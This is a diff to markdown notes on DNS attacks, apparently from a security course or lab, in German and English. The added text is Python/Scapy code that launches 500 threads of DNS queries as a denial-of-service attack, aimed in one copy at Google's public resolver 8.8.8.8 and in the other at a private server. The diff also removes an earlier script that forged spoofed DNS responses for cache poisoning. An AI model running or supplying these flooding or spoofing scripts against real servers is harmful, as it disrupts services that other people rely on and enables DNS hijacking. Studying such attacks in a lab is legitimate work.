@@ -53,6 +53,39 @@ dig +norecurse @192.168.122.7 foreman.de
 > -   Finally, we send the crafted DNS response packet towards the DNS server.
 
 ---
+### Denial of Service Attack
+
+```python
+from scapy.all import *
+import threading
+
+# Ziel-DNS-Server
+target_dns_server = "8.8.8.8"  # Google's DNS Server als Beispiel
+
+# Funktion zum Senden einer DNS-Anfrage
+def send_dns_request():
+    # Erstellen einer DNS-Anfrage für google.com
+    dns_request = IP(dst=target_dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com"))
+    # Senden der DNS-Anfrage
+    send(dns_request)
+
+# Hauptlogik: Erzeugen einer großen Anzahl von Threads, die jeweils eine DNS-Anfrage senden
+if __name__ == "__main__":
+    # Anzahl der Threads, die gleichzeitig laufen sollen
+    num_threads = 500
+    
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_dns_request)
+        thread.start()
+        threads.append(thread)
+    
+    # Warten, bis alle Threads abgeschlossen sind
+    for thread in threads:
+        thread.join()
+
+    print("Alle Threads abgeschlossen.")
+```
 
 ### DNS Cache-Poisining
 
@@ -73,32 +106,37 @@ dig +norecurse @192.168.122.7 foreman.de
    -  a ***denial of service attack*** such as DDOS can be used to kill the additional nameserver to spoof it
    - server got taken over by any other hack and gets controlled directly
      
-```Python
+```python
 from scapy.all import *
+import threading
 
-# Define the destination IP (the victim's DNS server)
-dst_ip = "8.8.8.8"  # Google's DNS server as an example
+# Target DNS Server
+target_dns_server = "192.168.22.7"  # Example: private DNS Server
 
-# Define the source IP (the attacker's IP, spoofed)
-src_ip = "192.168.1.100"
+# Function to send a DNS query
+def send_dns_request():
+    # Create a DNS query for google.com
+    dns_request = IP(dst=target_dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com"))
+    # Send the DNS query
+    send(dns_request)
 
-# Create a DNS query packet for test.example.com
-query_packet_test = IP(dst=dst_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="test.example.com"))
+# Main logic: Generate a large number of threads, each sending a DNS query
+if __name__ == "__main__":
+    # Number of threads to run simultaneously
+    num_threads = 500
+    
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_dns_request)
+        thread.start()
+        threads.append(thread)
+    
+    # Wait until all threads are completed
+    for thread in threads:
+        thread.join()
 
-# Create a DNS response packet for test.example.com with a spoofed IP address
-response_packet_test = IP(src=src_ip, dst=dst_ip)/UDP(sport=12345, dport=53)/DNS(id=query_packet_test[DNS].id, aa=True, qr=True, rcode=0, an=DNSRR(rrname="test.example.com", ttl=10, rdata="correct.ip.for.test.example.com"))
+    print("All threads completed.")
 
-# Create a DNS query packet for de.wikipedia.org
-query_packet_wiki = IP(dst=dst_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="de.wikipedia.org"))
-
-# Create a DNS response packet for de.wikipedia.org with a spoofed IP address
-response_packet_wiki = IP(src=src_ip, dst=dst_ip)/UDP(sport=12345, dport=53)/DNS(id=query_packet_wiki[DNS].id, aa=True, qr=True, rcode=0, an=DNSRR(rrname="de.wikipedia.org", ttl=10, rdata="192.0.2.1"))
-
-# Send the DNS response packets
-send(response_packet_test)
-send(response_packet_wiki)
-
-print("Sent DNS response packets.")
 ```
 
 ---
